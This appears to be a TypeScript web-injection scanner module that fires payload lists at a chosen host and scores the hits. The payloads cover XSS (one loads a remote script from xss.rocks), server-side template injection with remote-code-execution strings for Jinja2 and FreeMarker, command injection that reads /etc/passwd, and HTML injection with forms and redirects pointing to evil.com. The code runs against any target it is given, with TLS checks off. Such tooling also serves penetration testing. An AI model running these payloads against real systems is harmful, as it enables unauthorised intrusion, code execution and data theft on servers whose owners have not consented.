import * as http from "http";
import * as https from "https";
import { randomBytes } from "crypto";

export interface ScriptInjectionConfig {
  target: string;
  port: number;
  path: string;
  method: "GET" | "POST";
  paramName: string;
  technique: string;
  extraHeaders?: Record<string, string>;
}

export interface InjectionResult {
  technique: string;
  payload: string;
  status: "executed" | "reflected_unescaped" | "reflected_escaped" | "not_reflected" | "ssti_hit" | "cmdi_hit" | "error";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  severity: "critical" | "high" | "medium" | "info";
  timestamp: number;
}

export interface InjectionJob {
  id: string;
  config: ScriptInjectionConfig;
  startTime: number;
  active: boolean;
  results: InjectionResult[];
  summary: { executed: number; reflected: number; tested: number };
}

const jobs = new Map<string, InjectionJob>();
function makeId() { return randomBytes(8).toString("hex"); }

const NONCE = randomBytes(4).toString("hex");

const XSS_REFLECTED_PAYLOADS = [
  `<script>alert('XSS-${NONCE}')</script>`,
  `<img src=x onerror=alert('XSS-${NONCE}')>`,
  `<svg onload=alert('XSS-${NONCE}')>`,
  `<body onload=alert('XSS-${NONCE}')>`,
  `"><script>alert('XSS-${NONCE}')</script>`,
  `'><script>alert('XSS-${NONCE}')</script>`,
  `javascript:alert('XSS-${NONCE}')`,
  `<iframe src="javascript:alert('XSS-${NONCE}')">`,
  `<details open ontoggle=alert('XSS-${NONCE}')>`,
  `<input autofocus onfocus=alert('XSS-${NONCE}')>`,
  `<select onchange=alert('XSS-${NONCE}')><option>`,
  `<video><source onerror=alert('XSS-${NONCE}')>`,
  `<math><mtext></table></math><img src onerror=alert('XSS-${NONCE}')>`,
  `<script>fetch('http://xss.check/${NONCE}')</script>`,
  `<img src="x" onerror="eval(atob('YWxlcnQoJ1hTUy0ke05PTkNFfScpOw=='))">`,
  `%3Cscript%3Ealert('XSS-${NONCE}')%3C%2Fscript%3E`,
  `&lt;script&gt;alert('XSS-${NONCE}')&lt;/script&gt;`,
  `<ScRiPt>alert('XSS-${NONCE}')</ScRiPt>`,
  `<script/src="//xss.rocks/xss.js">`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">click</a>`,
  `{{7*7}}`,
  `${7*7}`,
  `<%= 7*7 %>`,
  `#{7*7}`,
  `*{7*7}`,
  `{7*7}`,
  `[[7*7]]`,
];

const XSS_HEADER_PAYLOADS = [
  { header: "X-Forwarded-For", value: `<script>alert('XSS-${NONCE}')</script>` },
  { header: "Referer", value: `javascript:alert('XSS-${NONCE}')` },
  { header: "User-Agent", value: `"><script>alert('XSS-${NONCE}')</script>` },
  { header: "X-Custom-Header", value: `<img src=x onerror=alert('XSS-${NONCE}')>` },
  { header: "Accept-Language", value: `en;q=1.0<script>alert('XSS-${NONCE}')</script>` },
];

const SSTI_PAYLOADS = [
  { payload: "{{7*7}}", expect: "49", engine: "Jinja2/Twig" },
  { payload: "${7*7}", expect: "49", engine: "FreeMarker/Groovy" },
  { payload: "<%= 7*7 %>", expect: "49", engine: "ERB/JSP" },
  { payload: "#{7*7}", expect: "49", engine: "Ruby" },
  { payload: "*{7*7}", expect: "49", engine: "Thymeleaf" },
  { payload: "{{7*'7'}}", expect: "7777777", engine: "Jinja2" },
  { payload: "{{config}}", expect: "config", engine: "Jinja2 config leak" },
  { payload: "{{self}}", expect: "self", engine: "Jinja2 object" },
  { payload: "a{{7*7}}b", expect: "a49b", engine: "Template engine" },
  { payload: "${\"freemarker.template.utility.Execute\"?new()('id')}", expect: "uid=", engine: "FreeMarker RCE" },
  { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", expect: "class", engine: "Jinja2 sandbox escape" },
  { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", expect: "uid=", engine: "Jinja2 RCE" },
  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", expect: "uid=", engine: "FreeMarker RCE" },
];

const CMDI_PAYLOADS = [
  { payload: "; id", expect: ["uid=", "gid="], desc: "Unix command injection via semicolon" },
  { payload: "| id", expect: ["uid=", "gid="], desc: "Pipe command injection" },
  { payload: "|| id", expect: ["uid=", "gid="], desc: "OR operator command injection" },
  { payload: "& id", expect: ["uid=", "gid="], desc: "Background command injection" },
  { payload: "&& id", expect: ["uid=", "gid="], desc: "AND operator command injection" },
  { payload: "`id`", expect: ["uid=", "gid="], desc: "Backtick command injection" },
  { payload: "$(id)", expect: ["uid=", "gid="], desc: "Subshell command injection" },
  { payload: "; cat /etc/passwd", expect: ["root:", "bin:", "nobody:"], desc: "File read via semicolon injection" },
  { payload: "| cat /etc/passwd", expect: ["root:", "bin:", "nobody:"], desc: "File read via pipe injection" },
  { payload: "; sleep 5", expect: [], desc: "Sleep-based blind command injection (timed)", timed: true },
  { payload: "& sleep 5", expect: [], desc: "Background sleep injection (timed)", timed: true },
  { payload: "127.0.0.1; ls -la", expect: ["."], desc: "Directory listing injection (ping-style)" },
  { payload: "127.0.0.1 && id", expect: ["uid="], desc: "AND command after IP injection" },
];

const HTML_INJECTION_PAYLOADS = [
  `<h1>Injected Heading</h1>`,
  `<b>Bold Injection</b>`,
  `<marquee>HTML Injection Test ${NONCE}</marquee>`,
  `<table><tr><td>Injected Table ${NONCE}</td></tr></table>`,
  `<a href="http://evil.com">Click me</a>`,
  `<form action="http://evil.com" method="POST"><input type="submit" value="Steal"></form>`,
  `<meta http-equiv="refresh" content="0;url=http://evil.com">`,
  `<link rel="stylesheet" href="http://evil.com/evil.css">`,
];

function sendRequest(
  config: ScriptInjectionConfig,
  payload: string,
  extraHeaders: Record<string, string> = {},
  cb: (code: number, body: string, rt: number, err?: string) => void
) {
  const isHttps = config.port === 443;
  const mod: typeof http | typeof https = isHttps ? https : http;
  const start = Date.now();
  let reqBody: string | null = null;
  let path = config.path;

  if (config.method === "GET") {
    const sep = config.path.includes("?") ? "&" : "?";
    path = `${config.path}${sep}${config.paramName}=${encodeURIComponent(payload)}`;
  } else {
    reqBody = `${config.paramName}=${encodeURIComponent(payload)}`;
  }

  const headers: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ...extraHeaders,
  };
  if (reqBody) {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    headers["Content-Length"] = String(reqBody.length);
  }

  const req = mod.request({
    hostname: config.target, port: config.port, path,
    method: config.method, headers, timeout: 10000, rejectUnauthorized: false,
  }, (res) => {
    let data = "";
    res.on("data", (c: Buffer) => { data += c.toString().slice(0, 4096); });
    res.on("end", () => cb(res.statusCode ?? 0, data, Date.now() - start));
  });
  req.on("timeout", () => { req.destroy(); cb(0, "", 10000, "timeout"); });
  req.on("error", (e) => cb(0, "", 0, e.message));
  if (reqBody) req.write(reqBody);
  req.end();
}

function analyzeXSS(payload: string, body: string): { status: InjectionResult["status"]; evidence?: string; severity: InjectionResult["severity"] } {
  const lower = body.toLowerCase();
  const payloadLower = payload.toLowerCase();

  if (body.includes(payload)) {
    const hasExecutable = /<script/i.test(body) && body.includes(payload) ||
      /onerror=/i.test(body) && body.includes(payload) ||
      /onload=/i.test(body) && body.includes(payload) ||
      /javascript:/i.test(body) && body.includes(payload);
    return {
      status: hasExecutable ? "executed" : "reflected_unescaped",
      evidence: `Payload reflected verbatim in response: ${body.slice(Math.max(0, body.indexOf(payload) - 30), body.indexOf(payload) + payload.length + 30)}`,
      severity: hasExecutable ? "critical" : "high",
    };
  }

  const rawPayload = payload.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
  if (body.includes(rawPayload) || lower.includes(payloadLower.replace(/</g, "&lt;").replace(/>/g, "&gt;"))) {
    return { status: "reflected_escaped", evidence: "Payload reflected but HTML-encoded — encoding is present (may still be vulnerable in JS context)", severity: "medium" };
  }

  return { status: "not_reflected", severity: "info" };
}

export function startInjectionScan(config: ScriptInjectionConfig): InjectionJob {
  const id = makeId();
  const job: InjectionJob = {
    id, config, startTime: Date.now(),
    active: true, results: [],
    summary: { executed: 0, reflected: 0, tested: 0 },
  };
  jobs.set(id, job);

  const addResult = (r: InjectionResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "executed" || r.status === "ssti_hit" || r.status === "cmdi_hit") job.summary.executed++;
    if (r.status === "reflected_unescaped") job.summary.reflected++;
  };

  const delay = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

  const runAll = async () => {
    const techniques = config.technique === "all"
      ? ["xss-reflected", "xss-headers", "ssti", "cmdi", "html-injection"]
      : [config.technique];

    if (techniques.includes("xss-reflected")) {
      for (const payload of XSS_REFLECTED_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "xss-reflected", payload, status: "error", responseTime: rt, evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const analysis = analyzeXSS(payload, body);
            addResult({ technique: "xss-reflected", payload, status: analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: analysis.severity, timestamp: Date.now() });
            resolve();
          });
        });
        await delay(80);
      }
    }

    if (techniques.includes("xss-headers") && job.active) {
      for (const { header, value } of XSS_HEADER_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          const extraHeaders: Record<string, string> = { [header]: value };
          sendRequest(config, "probe", extraHeaders, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "xss-headers", payload: `${header}: ${value}`, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const analysis = analyzeXSS(value, body);
            addResult({ technique: "xss-headers", payload: `${header}: ${value}`, status: analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: analysis.severity, timestamp: Date.now() });
            resolve();
          });
        });
        await delay(80);
      }
    }

    if (techniques.includes("ssti") && job.active) {
      for (const { payload, expect, engine } of SSTI_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "ssti", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const hit = body.includes(expect);
            addResult({
              technique: "ssti", payload, status: hit ? "ssti_hit" : "not_reflected",
              statusCode: code, responseTime: rt,
              evidence: hit ? `SSTI CONFIRMED: Template engine (${engine}) evaluated payload — response contains '${expect}'. Full response snippet: ${body.slice(0, 300)}` : undefined,
              severity: hit ? "critical" : "info", timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(100);
      }
    }

    if (techniques.includes("cmdi") && job.active) {
      for (const { payload, expect, desc, timed } of CMDI_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          const before = Date.now();
          sendRequest(config, payload, {}, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "cmdi", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            let hit = false;
            let evidence = "";
            if (timed) {
              hit = rt >= 4500;
              evidence = hit ? `Time-based command injection confirmed: response delayed ${rt}ms after SLEEP/sleep payload — ${desc}` : "";
            } else {
              const found = expect.find((e) => body.includes(e));
              hit = !!found;
              evidence = found ? `Command injection confirmed: response contains '${found}' — ${desc}. Response snippet: ${body.slice(0, 300)}` : "";
            }
            addResult({
              technique: "cmdi", payload, status: hit ? "cmdi_hit" : "not_reflected",
              statusCode: code, responseTime: rt, evidence: hit ? evidence : undefined,
              severity: hit ? "critical" : "info", timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(timed ? 6000 : 120);
      }
    }

    if (techniques.includes("html-injection") && job.active) {
      for (const payload of HTML_INJECTION_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "html-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const reflected = body.includes(payload);
            const encoded = body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
            addResult({
              technique: "html-injection", payload,
              status: reflected ? "reflected_unescaped" : encoded ? "reflected_escaped" : "not_reflected",
              statusCode: code, responseTime: rt,
              evidence: reflected ? `Raw HTML injected verbatim into response — enables phishing/UI redressing attacks` : undefined,
              severity: reflected ? "high" : encoded ? "medium" : "info",
              timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(80);
      }
    }

    job.active = false;
    jobs.delete(id);
  };

  runAll();
  return job;
}

export function getInjectionJob(id: string): InjectionJob | undefined {
  return jobs.get(id);
}

export function stopInjectionScan(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
